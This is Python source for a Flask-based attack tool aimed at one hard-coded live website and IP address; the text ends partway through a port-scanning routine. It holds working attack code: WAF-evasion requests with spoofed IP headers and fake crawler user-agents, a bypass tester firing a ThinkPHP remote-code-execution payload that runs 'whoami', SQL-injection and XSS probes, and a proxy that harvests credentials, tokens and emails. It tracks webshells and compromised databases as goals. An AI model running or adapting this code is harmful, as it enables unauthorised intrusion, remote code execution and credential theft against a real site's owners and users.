from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS
import requests
import base64
import os
import socket
import re
import json
import time
import threading
import hashlib
import subprocess
import zipfile
import io
import random
import string
import urllib.parse
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from bs4 import BeautifulSoup
from collections import defaultdict

# Optional imports with fallbacks
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False

try:
    import ftplib
    FTP_AVAILABLE = True
except ImportError:
    FTP_AVAILABLE = False

try:
    import pymongo
    PYMONGO_AVAILABLE = True
except ImportError:
    PYMONGO_AVAILABLE = False

try:
    import psycopg2
    PSYCOPG2_AVAILABLE = True
except ImportError:
    PSYCOPG2_AVAILABLE = False

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.')
CORS(app, resources={r"/*": {"origins": "*"}})

TARGET = "https://goldmedal.cc"
TARGET_IP = "31.59.114.216"

# ============================================================
# GLOBAL ATTACK STATE
# ============================================================
attack_state = {
    'open_ports': [],
    'open_ports_detailed': [],
    'discovered_credentials': [],
    'discovered_endpoints': [],
    'discovered_files': [],
    'vulnerable_params': [],
    'rce_verified': False,
    'rce_payloads_working': [],
    'current_shell': None,
    'extracted_configs': {},
    'bt_panel_url': None,
    'bt_panel_credentials': None,
    'git_files': [],
    'backup_files': [],
    'database_info': {},
    'attack_history': [],
    'session_cookies': {},
    'csrf_tokens': [],
    'api_keys': [],
    'admin_urls': [],
    'upload_endpoints': [],
    'webshell_locations': [],
    'lfi_vulnerabilities': [],
    'sqli_vulnerabilities': [],
    'ssrf_endpoints': [],
    'xss_vulnerabilities': [],
    'idor_vulnerabilities': [],
    'ssti_vulnerabilities': [],
    'command_injection': [],
    'file_inclusion': [],
    'xxe_vulnerabilities': [],
    'cors_misconfig': [],
    'jwt_tokens': [],
    'subdomains': [],
    'virtual_hosts': [],
    'tech_stack': {},
    'waf_detected': False,
    'waf_type': None,
    'cloudflare_detected': False,
    'rate_limiting_detected': False,
    'session_tokens': [],
    'oauth_endpoints': [],
    'graphql_endpoints': [],
    'swagger_docs': [],
    'robots_txt': [],
    'sitemap_xml': [],
    'dns_records': {},
    'ssl_info': {},
    'whois_info': {},
    'email_addresses': [],
    'phone_numbers': [],
    'social_links': [],
    'cms_detected': None,
    'server_type': None,
    'programming_languages': [],
    'frameworks': [],
    'libraries': [],
    'total_requests_sent': 0,
    'successful_exploits': 0,
    'waf_bypass_successful': 0,
    'scan_start_time': None,
    'scan_end_time': None,
}

executor = ThreadPoolExecutor(max_workers=50)
session_pool = {}
cache = {}
CACHE_DURATION = 30
request_lock = threading.Lock()
waf_lock = threading.Lock()

# WAF Evasion User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'curl/7.68.0',
    'python-requests/2.28.0',
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_session(waf_bypass=False):
    """Get or create a session with WAF evasion"""
    thread_id = threading.get_ident()
    session_key = f"{thread_id}_{'bypass' if waf_bypass else 'normal'}"
    
    if session_key not in session_pool:
        session = requests.Session()
        session.verify = False
        
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
        }
        
        if waf_bypass:
            headers.update({
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'X-Remote-Addr': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'Client-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            })
        
        session.headers.update(headers)
        session_pool[session_key] = session
    
    return session_pool[session_key]

def add_to_attack_state(category, data):
    """Add discovered data to attack state for chained attacks"""
    if category not in attack_state:
        attack_state[category] = []
    if isinstance(data, list):
        for item in data:
            if item not in attack_state[category]:
                attack_state[category].append(item)
    else:
        if data not in attack_state[category]:
            attack_state[category].append(data)
    
    attack_state['attack_history'].append({
        'timestamp': datetime.now().isoformat(),
        'category': category,
        'data': str(data)[:500]
    })
    
    if len(attack_state['attack_history']) > 1000:
        attack_state['attack_history'] = attack_state['attack_history'][-500:]

def increment_request_count():
    """Thread-safe request counter"""
    with request_lock:
        attack_state['total_requests_sent'] += 1

def is_waf_blocked(response_text, status_code):
    """Check if response indicates WAF blocking"""
    waf_signatures = [
        '网站防火墙', '不合法参数', '已被网站管理员设置拦截',
        '您的请求带有不合法参数', '网站管理员', '可能原因',
        '危险的攻击请求', '检查提交内容', '联系空间提供商',
        'Access Denied', 'Request Denied', 'Forbidden',
        'ModSecurity', 'mod_security', 'NSFocus', 'SafeDog',
        'YUNDUN', 'aliyun', 'waf.aliyun', 'T-Sec-WAF',
        'Tencent Cloud WAF', 'Qcloud', 'CloudWAF',
    ]
    
    if status_code in [403, 406, 501]:
        return True
    
    for sig in waf_signatures:
        if sig in response_text:
            return True
    
    return False

def waf_evasion_request(url, method='GET', data=None, max_retries=3):
    """Make requests with WAF evasion techniques"""
    
    evasion_techniques = [
        # Technique 1: Different User-Agent
        {'headers': {'User-Agent': get_random_user_agent()}},
        
        # Technique 2: Mobile User-Agent
        {'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'}},
        
        # Technique 3: Bot User-Agent
        {'headers': {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}},
        
        # Technique 4: Spoof internal IP
        {'headers': {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
        }},
        
        # Technique 5: Random external IP
        {'headers': {
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        }},
        
        # Technique 6: Accept different content types
        {'headers': {'Accept': 'application/json, text/plain, */*'}},
        
        # Technique 7: Referer from same domain
        {'headers': {'Referer': TARGET}},
        
        # Technique 8: Google Referer
        {'headers': {'Referer': 'https://www.google.com/'}},
    ]
    
    for attempt in range(max_retries):
        technique = evasion_techniques[attempt % len(evasion_techniques)]
        
        try:
            session = get_session(waf_bypass=True)
            headers = technique.get('headers', {})
            
            if method == 'GET':
                r = session.get(url, headers=headers, timeout=15, verify=False, allow_redirects=True)
            else:
                r = session.post(url, headers=headers, data=data, timeout=15, verify=False, allow_redirects=True)
            
            increment_request_count()
            
            # Check if still blocked
            if not is_waf_blocked(r.text, r.status_code):
                with waf_lock:
                    attack_state['waf_bypass_successful'] += 1
                return r
            
            # If blocked, add delay before retry
            time.sleep(random.uniform(0.5, 2.0))
            
        except Exception as e:
            continue
    
    # If all evasion failed, return the last response
    try:
        session = get_session()
        if method == 'GET':
            return session.get(url, timeout=15, verify=False)
        else:
            return session.post(url, data=data, timeout=15, verify=False)
    except:
        return None

def url_encode_payload(payload, encoding_level=1):
    """URL encode payload for WAF bypass"""
    encoded = payload
    for _ in range(encoding_level):
        encoded = quote(encoded, safe='')
    return encoded

def double_url_encode(payload):
    """Double URL encode payload"""
    return url_encode_payload(payload, 2)

def unicode_encode(payload):
    """Unicode encode payload characters"""
    return ''.join(f'\\u{ord(c):04x}' if c in '\\<>"\';()' else c for c in payload)

# ============================================================
# SERVE HTML & STATIC FILES
# ============================================================
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    return jsonify({'error': 'File not found'}), 404

# ============================================================
# ATTACK STATE MANAGEMENT
# ============================================================
@app.route('/attack-state')
def get_attack_state():
    """Get comprehensive attack state"""
    return jsonify({
        'attack_state': {
            'recon': {
                'open_ports': attack_state['open_ports'],
                'open_ports_detailed': attack_state['open_ports_detailed'][:50],
                'subdomains': attack_state['subdomains'],
                'dns_records': attack_state['dns_records'],
                'ssl_info': attack_state['ssl_info'],
                'tech_stack': attack_state['tech_stack'],
                'waf_detected': attack_state['waf_detected'],
                'waf_type': attack_state['waf_type'],
                'cloudflare_detected': attack_state['cloudflare_detected'],
                'cms_detected': attack_state['cms_detected'],
                'server_type': attack_state['server_type'],
            },
            'vulnerabilities': {
                'rce_verified': attack_state['rce_verified'],
                'rce_payloads': attack_state['rce_payloads_working'],
                'lfi_count': len(attack_state['lfi_vulnerabilities']),
                'sqli_count': len(attack_state['sqli_vulnerabilities']),
                'xss_count': len(attack_state['xss_vulnerabilities']),
                'idor_count': len(attack_state['idor_vulnerabilities']),
                'ssti_count': len(attack_state['ssti_vulnerabilities']),
                'command_injection': len(attack_state['command_injection']),
                'ssrf_count': len(attack_state['ssrf_endpoints']),
                'xxe_count': len(attack_state['xxe_vulnerabilities']),
            },
            'discoveries': {
                'credentials': len(attack_state['discovered_credentials']),
                'credentials_list': attack_state['discovered_credentials'][:20],
                'endpoints': len(attack_state['discovered_endpoints']),
                'endpoints_list': attack_state['discovered_endpoints'][:50],
                'files': len(attack_state['discovered_files']),
                'api_keys': len(attack_state['api_keys']),
                'jwt_tokens': len(attack_state['jwt_tokens']),
                'admin_urls': attack_state['admin_urls'][:20],
                'upload_endpoints': attack_state['upload_endpoints'][:20],
                'webshell_locations': attack_state['webshell_locations'],
                'backup_files': len(attack_state['backup_files']),
                'git_leaked': len(attack_state['git_files']) > 0,
                'database_compromised': len(attack_state['database_info']) > 0,
            },
            'exploitation': {
                'successful_exploits': attack_state['successful_exploits'],
                'waf_bypasses': attack_state['waf_bypass_successful'],
                'bt_panel_compromised': attack_state['bt_panel_credentials'] is not None,
                'current_shell': attack_state['current_shell'] is not None,
                'webshells_deployed': len(attack_state['webshell_locations']),
            },
            'stats': {
                'total_requests': attack_state['total_requests_sent'],
                'attack_history_count': len(attack_state['attack_history']),
                'scan_start_time': attack_state['scan_start_time'],
                'scan_end_time': attack_state['scan_end_time'],
            },
            'recent_attacks': attack_state['attack_history'][-20:],
            'email_addresses': attack_state['email_addresses'][:20],
            'social_links': attack_state['social_links'][:20],
        }
    })

@app.route('/reset-state')
def reset_attack_state():
    """Reset attack state"""
    global attack_state
    attack_state = {
        'open_ports': [],
        'open_ports_detailed': [],
        'discovered_credentials': [],
        'discovered_endpoints': [],
        'discovered_files': [],
        'vulnerable_params': [],
        'rce_verified': False,
        'rce_payloads_working': [],
        'current_shell': None,
        'extracted_configs': {},
        'bt_panel_url': None,
        'bt_panel_credentials': None,
        'git_files': [],
        'backup_files': [],
        'database_info': {},
        'attack_history': [],
        'session_cookies': {},
        'csrf_tokens': [],
        'api_keys': [],
        'admin_urls': [],
        'upload_endpoints': [],
        'webshell_locations': [],
        'lfi_vulnerabilities': [],
        'sqli_vulnerabilities': [],
        'ssrf_endpoints': [],
        'xss_vulnerabilities': [],
        'idor_vulnerabilities': [],
        'ssti_vulnerabilities': [],
        'command_injection': [],
        'file_inclusion': [],
        'xxe_vulnerabilities': [],
        'cors_misconfig': [],
        'jwt_tokens': [],
        'subdomains': [],
        'virtual_hosts': [],
        'tech_stack': {},
        'waf_detected': False,
        'waf_type': None,
        'cloudflare_detected': False,
        'rate_limiting_detected': False,
        'session_tokens': [],
        'oauth_endpoints': [],
        'graphql_endpoints': [],
        'swagger_docs': [],
        'robots_txt': [],
        'sitemap_xml': [],
        'dns_records': {},
        'ssl_info': {},
        'whois_info': {},
        'email_addresses': [],
        'phone_numbers': [],
        'social_links': [],
        'cms_detected': None,
        'server_type': None,
        'programming_languages': [],
        'frameworks': [],
        'libraries': [],
        'total_requests_sent': 0,
        'successful_exploits': 0,
        'waf_bypass_successful': 0,
        'scan_start_time': None,
        'scan_end_time': None,
    }
    return jsonify({'message': 'Attack state reset successfully', 'timestamp': datetime.now().isoformat()})

# ============================================================
# WAF DETECTION & BYPASS
# ============================================================
@app.route('/hunt/waf-detect')
def waf_detect():
    """Detect and identify WAF type"""
    waf_signatures = {
        'BT WAF (宝塔)': ['网站防火墙', '不合法参数', '已被网站管理员设置拦截', '宝塔'],
        'Cloudflare': ['cf-ray', 'cloudflare-nginx', '__cfduid', 'cf-chl-bypass'],
        'ModSecurity': ['ModSecurity', 'mod_security', 'This error was generated by Mod'],
        'Aliyun WAF': ['aliyun', 'waf.aliyun', 'YUNDUN', 'alibaba'],
        'Tencent WAF': ['tencent', 'waf.tencent', 'T-Sec-WAF', 'qcloud'],
        'SafeDog': ['safedog', 'SafeDog', 'safedog.cn'],
        'NSFocus': ['nsfocus', 'NSFocus'],
        'Baidu WAF': ['yunaq', 'baidu', 'bcebos'],
        '360 WAF': ['360wzb', 'wangzhan.360'],
        'Imperva': ['incapsula', 'imperva', 'visid_incap'],
        'F5 BIG-IP': ['bigip', 'big-ip', 'f5'],
        'FortiWeb': ['fortiwaf', 'fortiweb'],
        'Sucuri': ['sucuri', 'cloudproxy'],
        'Wordfence': ['wordfence', 'wfvt_'],
        'AWS WAF': ['awselb', 'aws'],
        'Akamai': ['akamai', 'ghost'],
    }
    
    detected_wafs = []
    
    # Benign request
    try:
        r = requests.get(TARGET, timeout=15, verify=False, allow_redirects=True)
        increment_request_count()
        
        headers_str = str(dict(r.headers)).lower()
        body_str = r.text[:3000]
        
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in headers_str or sig in body_str:
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)
                    break
        
        # Check for specific headers
        if 'server' in headers_str:
            server = r.headers.get('Server', '')
            if 'btwaf' in server.lower() or 'baota' in server.lower():
                detected_wafs.append('BT WAF (宝塔)')
                attack_state['waf_type'] = 'BT WAF'
        
    except Exception as e:
        pass
    
    # Malicious request to trigger WAF
    try:
        # Test SQL injection pattern
        r2 = requests.get(f"{TARGET}/?id=1%27%20OR%20%271%27=%271", timeout=15, verify=False,
                         headers={'User-Agent': get_random_user_agent()})
        increment_request_count()
        
        if is_waf_blocked(r2.text, r2.status_code):
            attack_state['waf_detected'] = True
            
            # Identify from block page
            if '宝塔' in r2.text or '网站防火墙' in r2.text:
                attack_state['waf_type'] = 'BT WAF'
                if 'BT WAF (宝塔)' not in detected_wafs:
                    detected_wafs.append('BT WAF (宝塔)')
        
        # Test XSS pattern
        r3 = requests.get(f"{TARGET}/?q=<script>alert(1)</script>", timeout=15, verify=False,
                         headers={'User-Agent': get_random_user_agent()})
        increment_request_count()
        
        if is_waf_blocked(r3.text, r3.status_code):
            attack_state['waf_detected'] = True
            
    except Exception as e:
        pass
    
    if attack_state['waf_detected'] and not attack_state['waf_type']:
        attack_state['waf_type'] = 'Unknown WAF'
    
    return jsonify({
        'waf_detected': attack_state['waf_detected'],
        'waf_type': attack_state['waf_type'],
        'detected_wafs': detected_wafs if detected_wafs else ['None detected'],
        'cloudflare': attack_state['cloudflare_detected'],
        'recommendation': 'Use WAF bypass techniques' if attack_state['waf_detected'] else 'Direct attacks may work'
    })

@app.route('/hunt/waf-bypass-test')
def waf_bypass_test():
    """Test various WAF bypass techniques"""
    
    # Original payload that gets blocked
    original_payload = '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami'
    
    bypass_variations = [
        # Standard
        {'name': 'Original', 'payload': original_payload, 'method': 'GET'},
        
        # URL Encoded
        {'name': 'URL Encoded', 'payload': url_encode_payload(original_payload), 'method': 'GET'},
        
        # Double URL Encoded
        {'name': 'Double URL Encoded', 'payload': double_url_encode(original_payload), 'method': 'GET'},
        
        # POST Method
        {'name': 'POST Method', 'payload': '/index.php', 'method': 'POST', 
         'data': 's=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami'},
        
        # With benign params
        {'name': 'With Benign Params', 'payload': original_payload + '&page=1&lang=en', 'method': 'GET'},
        
        # Case variation
        {'name': 'Case Variation', 'payload': original_payload.replace('system', 'SyStEm'), 'method': 'GET'},
        
        # HTTP Parameter Pollution
        {'name': 'Parameter Pollution', 'payload': original_payload + '&s=index', 'method': 'GET'},
        
        # With null bytes
        {'name': 'Null Byte', 'payload': original_payload + '%00', 'method': 'GET'},
        
        # Encoded backslash
        {'name': 'Encoded Backslash', 'payload': original_payload.replace('\\', '%5c'), 'method': 'GET'},
        
        # Double encoded backslash
        {'name': 'Double Encoded Backslash', 'payload': original_payload.replace('\\', '%255c'), 'method': 'GET'},
    ]
    
    results = []
    
    for bypass in bypass_variations:
        try:
            payload = bypass['payload']
            method = bypass['method']
            data = bypass.get('data')
            
            # Try with WAF evasion
            if method == 'GET':
                if data:
                    r = waf_evasion_request(f"{TARGET}{payload}?{data}", method='GET')
                else:
                    r = waf_evasion_request(f"{TARGET}{payload}", method='GET')
            else:
                r = waf_evasion_request(f"{TARGET}{payload}", method='POST', data=data)
            
            if r:
                blocked = is_waf_blocked(r.text, r.status_code)
                success = not blocked and r.status_code == 200 and len(r.text) > 20
                
                results.append({
                    'technique': bypass['name'],
                    'status': r.status_code,
                    'length': len(r.text),
                    'blocked': blocked,
                    'success': success,
                    'snippet': r.text[:300] if not blocked else 'BLOCKED BY WAF'
                })
                
                if success:
                    add_to_attack_state('attack_history', [f'WAF bypass: {bypass["name"]}'])
                    
        except Exception as e:
            results.append({
                'technique': bypass['name'],
                'error': str(e)
            })
    
    return jsonify({
        'waf_type': attack_state['waf_type'],
        'bypass_results': results,
        'working_bypasses': [r for r in results if r.get('success')],
        'total_tested': len(results)
    })

# ============================================================
# PROXY WITH WAF EVASION
# ============================================================
@app.route('/proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
def proxy():
    path = request.args.get('path', '/')
    custom_headers = request.args.get('headers', '{}')
    follow_redirects = request.args.get('follow', 'false').lower() == 'true'
    bypass_waf = request.args.get('bypass_waf', 'false').lower() == 'true'
    
    try:
        extra_headers = json.loads(custom_headers)
    except:
        extra_headers = {}
    
    url = f"{TARGET}/{path.lstrip('/')}"
    
    cache_key = f"proxy:{request.method}:{url}:{str(extra_headers)}:{bypass_waf}"
    if request.method == 'GET' and cache_key in cache:
        cached_time, cached_data = cache[cache_key]
        if time.time() - cached_time < CACHE_DURATION:
            return jsonify(cached_data)
    
    headers = {
        'User-Agent': request.headers.get('User-Agent', extra_headers.get('User-Agent', get_random_user_agent())),
        'Accept': extra_headers.get('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
        'Accept-Language': extra_headers.get('Accept-Language', 'en-US,en;q=0.5'),
    }
    
    if bypass_waf:
        headers.update({
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            'X-Real-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
        })
    
    headers.update(extra_headers)
    
    cookies = {}
    if 'custom_cookie' in request.args:
        encoded = base64.b64encode(request.args['custom_cookie'].encode()).decode()
        cookies['username'] = encoded
    
    try:
        session = get_session(waf_bypass=bypass_waf)
        increment_request_count()
        
        if request.method == 'GET':
            resp = session.get(url, headers=headers, cookies=cookies, 
                             allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'POST':
            resp = session.post(url, headers=headers, cookies=cookies,
                              data=request.get_data(), allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'PUT':
            resp = session.put(url, headers=headers, cookies=cookies,
                             data=request.get_data(), allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'DELETE':
            resp = session.delete(url, headers=headers, cookies=cookies,
                                allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'PATCH':
            resp = session.patch(url, headers=headers, cookies=cookies,
                               data=request.get_data(), allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'HEAD':
            resp = session.head(url, headers=headers, cookies=cookies,
                              allow_redirects=follow_redirects, timeout=30)
        else:
            resp = session.request(request.method, url, headers=headers,
                                 cookies=cookies, data=request.get_data(),
                                 allow_redirects=follow_redirects, timeout=30)
        
        body = resp.text[:50000]
        
        # Auto-discovery
        discoveries = {
            'new_endpoints': [],
            'credentials_found': [],
            'csrf_tokens': [],
            'api_keys': [],
            'jwt_tokens': [],
            'email_addresses': [],
            'admin_urls': [],
            'upload_forms': [],
            'hidden_inputs': [],
            'comments': [],
            'javascript_files': [],
            'technology_indicators': [],
        }
        
        # Extract URLs
        all_urls = re.findall(r'(?:href|src|action|url|content)\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
        discoveries['new_endpoints'] = [u for u in all_urls if u.startswith('/') or TARGET.replace('https://', '') in u][:30]
        
        # Extract API endpoints
        api_patterns = re.findall(r'["\'](\/[a-zA-Z0-9/_-]*(?:api|v\d|graphql|rest|soap|oauth|login|register|admin|dashboard|upload|download|config|setting|user|account|profile|password|token|auth|session)[a-zA-Z0-9/_.-]*)["\']', body, re.IGNORECASE)
        discoveries['new_endpoints'].extend(api_patterns[:30])
        
        # Extract credentials
        cred_patterns = [
            r'(?:password|passwd|pwd|pass)\s*[:=]\s*["\']([^"\']{3,50})["\']',
            r'(?:secret|api_key|apikey|token|auth_token|access_token|bearer)\s*[:=]\s*["\']([^"\']{8,})["\']',
            r'(?:username|user|email|login)\s*[:=]\s*["\']([^"\']{3,50})["\']',
            r'(?:database|db_name|db_host|db_user|db_pass)\s*[:=]\s*["\']([^"\']{3,50})["\']',
            r'(?:ftp|ssh|mysql|redis|mongodb)\s*[:=]\s*["\']([^"\']{3,50})["\']',
        ]
        for pattern in cred_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            discoveries['credentials_found'].extend(matches)
        
        # Extract CSRF tokens
        csrf_patterns = [
            r'(?:csrf|_token|authenticity_token|nonce|xsrf).*?value\s*=\s*["\']([^"\']+)["\']',
            r'<meta\s+name\s*=\s*["\']csrf[^"\']*["\']\s+content\s*=\s*["\']([^"\']+)["\']',
        ]
        for pattern in csrf_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            discoveries['csrf_tokens'].extend(matches)
        
        # Extract JWT tokens
        jwt_pattern = r'(?:Bearer\s+)?(eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})'
        discoveries['jwt_tokens'] = re.findall(jwt_pattern, body)
        
        # Extract emails
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        discoveries['email_addresses'] = list(set(re.findall(email_pattern, body)))[:20]
        
        # Extract admin URLs
        admin_patterns = re.findall(r'["\'](\/(?:admin|administrator|wp-admin|dashboard|panel|manage|control|backend|cms)[a-zA-Z0-9/_-]*)["\']', body, re.IGNORECASE)
        discoveries['admin_urls'] = admin_patterns[:20]
        
        # Extract upload forms
        if 'enctype="multipart/form-data"' in body or 'type="file"' in body:
            discoveries['upload_forms'].append(url)
        
        # Extract hidden inputs
        hidden_inputs = re.findall(r'<input[^>]+type\s*=\s*["\']hidden["\'][^>]+name\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
        discoveries['hidden_inputs'] = hidden_inputs[:20]
        
        # Extract comments
        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        discoveries['comments'] = [c.strip()[:200] for c in comments if len(c.strip()) > 5][:20]
        
        # Extract JS files
        js_files = re.findall(r'<script[^>]+src\s*=\s*["\']([^"\']+\.js[^"\']*)["\']', body, re.IGNORECASE)
        discoveries['javascript_files'] = js_files[:20]
        
        # Detect tech stack
        tech_indicators = {
            'ThinkPHP': 'thinkphp' in body.lower() or 'think\\' in body,
            'Laravel': 'laravel' in body.lower() or 'laravel_session' in str(resp.cookies),
            'WordPress': 'wp-content' in body.lower() or 'wordpress' in body.lower(),
            'Joomla': 'joomla' in body.lower(),
            'Drupal': 'drupal' in body.lower(),
            'Vue.js': 'vue' in body.lower() or 'v-bind' in body or 'v-model' in body,
            'React': 'react' in body.lower() or '__REACT' in body,
            'Angular': 'ng-' in body or 'angular' in body.lower(),
            'jQuery': 'jquery' in body.lower(),
            'Bootstrap': 'bootstrap' in body.lower(),
            'Nginx': resp.headers.get('Server', '').lower().startswith('nginx'),
            'Apache': 'apache' in resp.headers.get('Server', '').lower(),
            'PHP': 'php' in resp.headers.get('X-Powered-By', '').lower() or '.php' in url,
            'MySQL': 'mysql' in body.lower(),
            'Cloudflare': 'cf-ray' in resp.headers or 'cloudflare' in resp.headers.get('Server', '').lower(),
        }
        for tech, detected in tech_indicators.items():
            if detected:
                discoveries['technology_indicators'].append(tech)
        
        # Store discoveries
        if discoveries['new_endpoints']:
            add_to_attack_state('discovered_endpoints', discoveries['new_endpoints'])
        if discoveries['credentials_found']:
            add_to_attack_state('discovered_credentials', discoveries['credentials_found'])
        if discoveries['csrf_tokens']:
            add_to_attack_state('csrf_tokens', discoveries['csrf_tokens'])
        if discoveries['jwt_tokens']:
            add_to_attack_state('jwt_tokens', discoveries['jwt_tokens'])
        if discoveries['email_addresses']:
            add_to_attack_state('email_addresses', discoveries['email_addresses'])
        if discoveries['admin_urls']:
            add_to_attack_state('admin_urls', discoveries['admin_urls'])
        if discoveries['upload_forms']:
            add_to_attack_state('upload_endpoints', discoveries['upload_forms'])
        if discoveries['technology_indicators']:
            add_to_attack_state('tech_stack', discoveries['technology_indicators'])
        if discoveries['javascript_files']:
            add_to_attack_state('discovered_files', discoveries['javascript_files'])
        
        # Detect WAF/Cloudflare
        if 'cf-ray' in resp.headers or 'cloudflare' in resp.headers.get('Server', '').lower():
            attack_state['cloudflare_detected'] = True
        if is_waf_blocked(body, resp.status_code):
            attack_state['waf_detected'] = True
            if '宝塔' in body or '网站防火墙' in body:
                attack_state['waf_type'] = 'BT WAF'
        
        # Detect server type
        server_header = resp.headers.get('Server', '')
        if server_header:
            attack_state['server_type'] = server_header
        
        result = {
            'url': url,
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'cookies': dict(resp.cookies),
            'body': body,
            'length': len(resp.text),
            'timestamp': datetime.now().isoformat(),
            'waf_blocked': is_waf_blocked(body, resp.status_code),
            'bypass_used': bypass_waf,
            'auto_discoveries': {k: v[:10] if isinstance(v, list) else v for k, v in discoveries.items()},
            'discovery_summary': {
                'endpoints_found': len(discoveries['new_endpoints']),
                'credentials_found': len(discoveries['credentials_found']),
                'tokens_found': len(discoveries['csrf_tokens']),
                'jwts_found': len(discoveries['jwt_tokens']),
                'emails_found': len(discoveries['email_addresses']),
                'admin_urls_found': len(discoveries['admin_urls']),
                'technologies': discoveries['technology_indicators'],
            }
        }
        
        if request.method == 'GET':
            cache[cache_key] = (time.time(), result)
        
        return jsonify(result)
    except requests.exceptions.Timeout:
        return jsonify({'error': 'Request timed out', 'url': url}), 504
    except requests.exceptions.ConnectionError:
        return jsonify({'error': 'Connection failed', 'url': url}), 502
    except Exception as e:
        return jsonify({'error': str(e), 'url': url}), 500

# ============================================================
# COMPREHENSIVE PORT SCANNING
# ============================================================
@app.route('/hunt/scan-common-ports')
def scan_common_ports():
    """Enhanced comprehensive port scanning with service detection"""
    ports_to_scan = [
        (21, 'FTP'), (22, 'SSH'), (23, 'Telnet'), (25, 'SMTP'),
        (53, 'DNS'), (80, 'HTTP'), (81, 'HTTP-Alt'),
        (110, 'POP3'), (111, 'RPC'), (135, 'MSRPC'),
        (139, 'NetBIOS'), (143, 'IMAP'), (443, 'HTTPS'),
